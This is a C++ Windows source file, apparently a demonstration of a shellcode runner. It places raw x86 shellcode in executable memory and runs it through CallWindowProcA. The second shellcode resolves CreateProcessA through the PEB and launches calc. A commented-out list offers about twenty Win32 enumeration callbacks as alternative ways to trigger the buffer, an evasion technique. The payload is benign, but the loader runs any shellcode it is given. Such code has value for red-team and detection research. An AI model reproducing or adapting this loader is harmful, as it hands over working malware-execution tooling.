
#include <iostream>
#include <Windows.h>


bool is32bit() {

    char shellcode[] =
        "\x31\xC0\x48\x0F\x88\x00\x00\x00\x00\xC3";

    void* fnPtr = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(fnPtr, shellcode, sizeof(shellcode));

    bool is32bit = CallWindowProcA(WNDPROC(fnPtr), 0, 0, 0, 0);

    VirtualFree(fnPtr, 0, MEM_RELEASE);

    return is32bit;
}



int main()
{

    printf(
        "in 32bit env: %hs", is32bit() ? "yep" : "nope"
    );

    char shellcode[] =
        "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
        "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
        "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
        "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
        "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
        "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
        "\x45\x81\x3e\x43\x72\x65\x61\x75"
        "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
        "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
        "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
        "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
        "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
        "\x6c\x63\x89\xe2\x52\x52\x53\x53"
        "\x53\x53\x53\x53\x52\x53\xff\xd7";

    void * fnPtr = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    memcpy(fnPtr, shellcode, sizeof(shellcode));


    //CallWindowProcA(WNDPROC(fnPtr), 0, 0, 0, 0);

    //EnumWindowStationsA(WINSTAENUMPROCA(fnPtr), 0);

    //EnumPropsA(GetDesktopWindow(), PROPENUMPROCA(fnPtr));

    //EnumTimeFormatsA(TIMEFMT_ENUMPROCA(fnPtr), LOCALE_SYSTEM_DEFAULT, 0);

    //EnumDateFormatsA(DATEFMT_ENUMPROCA(fnPtr), LOCALE_SYSTEM_DEFAULT, 0);

    //EnumSystemGeoNames(GEOCLASS_NATION, GEO_ENUMNAMEPROC(fnPtr), 0);

    //EnumLanguageGroupLocalesA(LANGGROUPLOCALE_ENUMPROCA(fnPtr), 
    //    LGRPID_SIMPLIFIED_CHINESE, 0, 0);

    //EnumCalendarInfoA( CALINFO_ENUMPROCA(fnPtr), 
    //    LOCALE_SYSTEM_DEFAULT, 
    //    ENUM_ALL_CALENDARS, 
    //    CAL_RETURN_NUMBER | CAL_ITWODIGITYEARMAX);

    //EnumChildWindows(0, WNDENUMPROC(fnPtr), 0);

    //EnumDesktopsA(0, DESKTOPENUMPROCA(fnPtr), 0);

    //EnumDesktopWindows(0, WNDENUMPROC(fnPtr), 0);

    //EnumSystemCodePagesA(CODEPAGE_ENUMPROCA(fnPtr), 0);

    //EnumSystemGeoID(GEOCLASS_NATION, 0, GEO_ENUMPROC(fnPtr));

    //EnumSystemLanguageGroupsA(LANGUAGEGROUP_ENUMPROCA(fnPtr), LGRPID_SUPPORTED, 0);

    //EnumSystemLocalesA(LOCALE_ENUMPROCA(fnPtr), 0);

    //EnumThreadWindows(0, WNDENUMPROC(fnPtr), 0);

    //EnumUILanguagesA(UILANGUAGE_ENUMPROCA(fnPtr), MUI_LANGUAGE_ID, 0);

    //EnumWindows(WNDENUMPROC(fnPtr), 0);

    return EXIT_SUCCESS;
}